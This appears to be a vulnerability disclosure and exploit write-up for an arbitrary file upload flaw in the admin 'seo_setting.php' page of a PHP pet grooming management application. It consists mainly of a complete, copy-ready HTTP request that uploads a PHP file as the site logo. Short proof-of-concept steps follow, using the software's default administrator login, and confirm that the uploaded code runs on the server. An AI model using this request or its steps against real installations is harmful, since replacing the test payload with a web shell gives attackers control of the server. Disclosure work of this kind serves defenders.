

# Pet grooming management software  - 'seo_setting.php' Arbitrary File Upload

#### Exploit Title: Pet grooming management software - Arbitrary File Upload

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: [https://www.sourcecodester.com](https://www.sourcecodester.com/)

#### Software Link:https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html

#### Version: Pet grooming management software 1.0

#### Tested on: Windows 10, Apache ,Mysql

#### Description

The pet grooming management software has a vulnerability in uploading arbitrary files. In the 'seo_setting.php'  file, due to insufficient filtering of file suffixes, attackers can exploit this vulnerability to gain server privileges by uploading malicious files.

#### Payload used:

```
POST /admin/seo_setting.php HTTP/1.1
Host: 192.168.67.28:8021
Accept-Encoding: gzip, deflate
Origin: http://192.168.67.28:8021
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynrYRiaBMmUAHonyv
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.67.28:8021/admin/manage_website.php
Cookie: PHPSESSID=nn7i1gq9g3c5789ch9hgs6nogg
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 3656

------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="deduct"

1
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="title"

Pet Grooming Billing Software
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="currency_symbol"

₹
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="old_website_image"

Pets_Logo.png
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="website_image"; filename="111.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="old_favicon"

favicon_pet.png
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="favicon"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="old_qr"

dumm_qr(1).png
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="qr"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="footer"

Pet Grooming Billing Software
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="term"

<h4>1. <strong>Appointments &amp; Timings</strong></h4><p>Clients must arrive on time for scheduled appointments.</p><p>A delay of more than 15 minutes may result in rescheduling.</p><p>Walk-ins are accepted based on availability.</p><h4>2<strong>. Health &amp; Vaccinations</strong></h4><p>Pets must be up to date with vaccinations (especially Rabies).</p><p>We reserve the right to refuse service if a pet shows signs of illness, infection, or aggressive behavior.</p><p>The client must inform us of any medical conditions, allergies, or behavioral issues.</p><h4>3. <strong>Grooming Safety</strong></h4><p>We use safe, pet-friendly grooming products and tools.</p><p>In case of extreme matting, hair may need to be shaved to avoid injury.</p><p>We are not liable for any pre-existing conditions or issues arising from matting, skin problems, or aggressive behavior.</p><h4>4. <strong>Emergency Care</strong></h4><p>In the event of an injury or health concern during grooming, we will attempt to contact the owner immediately.</p><p>If needed, the pet may be taken to the nearest veterinary clinic at the owner's expense.</p><h4>5. <strong>Cancellations &amp; No-Shows</strong></h4><p>Please provide at least 24 hours’ notice for cancellations.</p><p>No-shows or last-minute cancellations may incur a fee.</p><h4>6. <strong>Photographs</strong></h4><p>We may take photos of pets after grooming for promotional use on our website or social media unless the client requests otherwise.</p><h4>7. <strong>Payment Terms</strong></h4><p>Full payment is required upon completion of grooming.</p><p>Prices may vary depending on breed, size, coat condition, and service duration.</p>
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="old_sign"

images (1).png
------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="sign"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarynrYRiaBMmUAHonyv
Content-Disposition: form-data; name="btn_web"


------WebKitFormBoundarynrYRiaBMmUAHonyv--

```

#### Proof of Concept

1、Log in to the system using the default password mdkhairnar92@gmail.com: admin

2、Request the /admin/seo_setting.php interface to modify the website_image to the PHP malicious file we are about to upload.

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/uploadpayloadseo.png)

4、After sending the request packet, the file can be accessed on the page, and the PHP file has been parsed, displaying information related to PHPINfo.

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/uploadlocation.png)

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/uploadpageseo.png)

5、Source code related to vulnerabilities.

![image](https://github.com/joinia/webray.com.cn/blob/main/Pet-grooming-management-software/images/code-seosetting.png)
